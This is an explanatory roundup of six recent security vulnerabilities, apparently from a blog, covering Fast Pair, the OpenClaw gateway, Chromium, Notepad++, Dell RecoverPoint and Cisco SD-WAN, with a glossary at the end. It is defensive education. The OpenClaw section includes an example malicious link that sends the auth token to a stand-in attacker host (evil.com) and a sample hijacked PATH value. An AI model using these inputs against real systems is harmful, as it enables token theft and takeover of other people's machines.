---

## **1\. WhisperPair Pairing Logic Flaw** **(CVE-2025-36911)**

A flaw in Google’s Fast Pair implementation allowed anyone to forcefully pair with a vulnerable accessory.

[Google’s Fast Pair](https://www.android.com/better-together/fast-pair/) enables one-tap pairing across bluetooth accessories. It is the same technology that lets your phone recognise your headphones as soon as you put them into pairing mode. It also lets you find lost accessories and track their location (this becomes a great [attack vector](#attack-vector)!).

![Image of Google's Fast Pair in action][image1]

WhisperPair enables attackers to forcibly pair a Vulnerable Fast Pair accessory with an attacker-controlled device without user consent. This gives the attacker full control over the accessory, allowing them to play audio at high volumes or record conversations using the microphone.

Some devices also support Google’s Find Hub network. This allows users to find their lost accessories using crowdsourced location reports. However, if an accessory has never been paired with an Android device (people using iPhones), an attacker can add the accessory using their own Google account. This allows the attacker to track the user via the compromised accessory.

![][image2] ![][image3]

The only way to fix this vulnerability is by installing a software update issued by the manufacturer of the accessory. For guidance on assessing your device's vulnerability and steps to protect yourself (although you’re basically helpless here), refer to the [official WhisperPair website](https://whisperpair.eu/).

**Read more**  
[NVD - CVE-2025-36911](https://nvd.nist.gov/vuln/detail/CVE-2025-36911)  
[https://whisperpair.eu/](https://whisperpair.eu/)

---

## **2\. OpenClaw Gateway Token Leak \+ Docker Sandbox Injection** **(CVE-2026-25253, CVE-2026-24763)**

### [**1-Click RCE**](#rce) **via Token Theft (CVE-2026-25253)**

An attacker can trick you into clicking a link, steal your login token,and then take full control of your AI gateway.

Clawdbot's web dashboard reads a `gatewayUrl` parameter straight from the URL in your browser, like: `https://your-clawdbot/?gatewayUrl=https://evil.com`  
When the page loads, it automatically connects to whatever URL is in that parameter and sends your authentication token along with it without any warning or confirmation.

So an attacker crafts a malicious link pointing `gatewayUrl` to their own server. Once you click it, your browser sends your token to the attacker, which gives them operator-level access to your gateway and can run arbitrary code on your machine. This works even if your gateway is only listening on `localhost` because your own browser is the one making the connection, acting as a bridge.

**Fix:** The app now asks you to confirm before connecting to a new gateway URL.

### [**Command Injection**](#command-injection) **via PATH Variable (CVE-2026-24763)**

A logged-in user can manipulate an environment variable to run arbitrary commands inside the Docker container.

When Clawdbot runs code in Docker sandbox mode, it builds shell commands internally, but it uses the `PATH` environment variable without sanitizing or validating those commands.

If you can control what `PATH` looks like (e.g., set it to something like `/malicious/bin:/usr/bin`), the shell will look in your malicious directory first when executing commands.

Although this requires you to already be authenticated, it's not as easy to exploit remotely, but it's still high severity because once exploited, you get full access to the container filesystem, environment variables, and any sensitive data inside.

**Fix:** The PATH variable is now handled safely and regression tests were added.

**Read more**  
[https://github.com/advisories/GHSA-g8p2-7wf7-98mq](https://github.com/advisories/GHSA-g8p2-7wf7-98mq)  
[https://github.com/advisories/GHSA-mc68-q9jw-2h3v](https://github.com/advisories/GHSA-mc68-q9jw-2h3v)

---

## **3\. Chromium CSS Use-After-Free** **(CVE-2026-2441)**

A [use-after-free vulnerability](#use-after-free) in Chromium’s CSS handling code allowed attackers to potentially crash the browser or run malicious code through a specially crafted webpage.

The issue occurred because the browser would sometimes continue using a piece of memory after it had already been released/freed. Normally, when the browser finishes using an object in memory, it frees that memory so that it can be reused. In this case, however, the CSS processing component could mistakenly try to access that memory even after being freed.

If an attacker could control what data replaced that freed memory, the browser might end up reading or executing unintended data, which could lead to [memory corruption](#memory-corruption) or code execution inside the browser process. Because the browser is the main interface between a user’s system and the open internet, weaknesses in its filtering or security controls can expose the system to serious threats.

**Read more**  
[CVE-2026-2441](https://nvd.nist.gov/vuln/detail/CVE-2026-2441)

---

## **4\. Notepad++ Updater Integrity Bypass** **(CVE-2025-15556)**

A [supply chain compromise](#supply-chain-compromise) that allowed attackers to push fake updates into victims computers through the autoupdater.

A security issue was discovered in the update system used by older versions of Notepad++, specifically the WinGUp auto-updater. The vulnerability existed because application versions before 8.8.9 did not properly verify the authenticity of update metadata and downloaded installers. As a result, attackers could potentially intercept or redirect update traffic and trick the program into downloading a malicious update instead of the legitimate one.

If this happened, the Notepad++ updater could be manipulated into downloading and executing an attacker-controlled installer, which could allow malicious code to run on the victim’s computer.

This type of incident is often described as a [supply chain compromise](#supply-chain-compromise) because the attack targeted the software delivery process rather than the Notepad++ application itself. Instead of modifying the program’s source code, attackers attempted to exploit the trusted update mechanism used to distribute software updates.

Reports and the official explanation suggest that the activity involved selective targeting, meaning it did not affect all users. Instead, only certain users’ update traffic was redirected, and some external analyses have described the campaign as being more consistent with espionage-focused targeting rather than large-scale cybercrime.

**Read more**  
[Official Writeup](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)  
[Another cool article](https://www.picussecurity.com/resource/blog/notepad-supply-chain-attack-chrysalis-backdoor)  
[CVE-2025-15556](https://nvd.nist.gov/vuln/detail/CVE-2025-15556)

---

## **5\. Dell RecoverPoint for VMs Hard-Coded Credentials (CVE-2026-22769)**

[Hardcoded credential vulnerability](https://cwe.mitre.org/data/definitions/798.html) lead to privilege escalation allowing attackers to gain higher level access on affected systems.

[Dell RecoverPoint for Virtual Machines](https://www.dell.com/en-in/lp/dt/data-protection-suite-recoverpoint-for-virtual-machines) is a disaster recovery tool that lets organizations back up and restore virtual machines. It contained a hardcoded credential, a username and password baked directly into the software that is the same across every single installation. Because the credential is hardcoded, it cannot be disabled through normal configuration either.

An unauthenticated remote attacker with knowledge of the hardcoded credential could exploit this vulnerability, leading to unauthorized access to the underlying operating system and [root-level](#root-level) persistence.

This exploit had been actively exploited by a Chinese state-sponsored hacking group called UNC6201. They've been in victims' systems for over a year before anyone knew the vulnerability existed. Mandiant (a major cybersecurity firm) caught it while investigating a breach, and so far fewer than a dozen organizations are confirmed affected, though the real number is likely higher.

**Read more**  
[CVE-2026-22769](https://nvd.nist.gov/vuln/detail/CVE-2026-22769)  
[CVE-2026-22769: Critical Dell RecoverPoint Zero-Day Exploited in the Wild | SOC Prime](https://socprime.com/blog/cve-2026-22769-vulnerability/)  
[Dell RecoverPoint Zero-Day Exploited by Chinese Cyberespionage Group \- SecurityWeek](https://www.securityweek.com/dell-recoverpoint-zero-day-exploited-by-chinese-cyberespionage-group/)

---

## **6\. Cisco SD-WAN Authentication Bypass \+ Privilege Escalation** **(CVE-2026-20127, CVE-2022-20775)**

A combination of two vulnerabilities, CVE-2026-20127, an authentication bypass, and CVE-2022-20775, a privilege escalation flaw allowed attackers to gain admin access to network management systems.

The issue involved two separate vulnerabilities CVE-2026-20127, an [authentication bypass](#authentication-bypass) and CVE-2022-20775, a privilege escalation flaw. Together these weaknesses could allow an attacker to access parts of the system without valid credentials and then increase their level of access once inside.

An authentication bypass is when a system fails to properly verify a user’s identity, allowing someone to access protected functionality without logging in. In this case the attacker could exploit the vulnerability to interact with certain components of the Cisco SD-WAN management interface.

After gaining this initial access, the attacker could take advantage of the privilege escalation vulnerability, allowing them to obtain higher-level permissions than they should normally have. This could potentially give the attacker administrative control over parts of the system.

Cisco SD-WAN is often used to manage enterprise network infrastructure, so successful exploitation could allow attackers to modify network configurations, disrupt connectivity or gain deeper access to internal systems.

**Read more**  
[CVE-2026-20127](https://nvd.nist.gov/vuln/detail/CVE-2026-20127)  
[CVE-2022-20775](https://nvd.nist.gov/vuln/detail/cve-2022-20775)  
[Hacker News article](https://thehackernews.com/2026/03/cisco-confirms-active-exploitation-of.html)

---

# Glossary

### Attack Vector

An attack vector is the path or method an attacker uses to gain unauthorized access to a system, device, application or a network i.e how the attack gets in.

### Command Injection

You trick a program into running your own system commands by sneaking them into input it passes directly to the shell.

### RCE

Vulnerability that allows an attacker to remotely execute arbitrary code on a target system without needing physical access.

### Use-After-Free

Critical memory corruption vulnerability where a program continues to use a pointer after the memory it points to has been freed.

### Memory Corruption

Critical bug where a program unintentionally modifies it’s own memory leading to instability crashes or severe security vulnerabilities such as RCE.

### Supply Chain Compromise

Cyber attack where attackers target the trusted process used to build, distribute or update software or services, instead of attacking the end user directly.

### Root Level

The highest level of control possible on a system.

### Authentication Bypass

Security vulnerability that occurs when the system fails to properly verify a user’s identity, allowing attackers to gain access to protected resources, data or administrative functions.

### Zero-Day

A previously unknown software flaw that attackers discover and exploit before the developer has had time to fix it.

### CVE

A publicly disclosed catalogue of information security vulnerabilities.
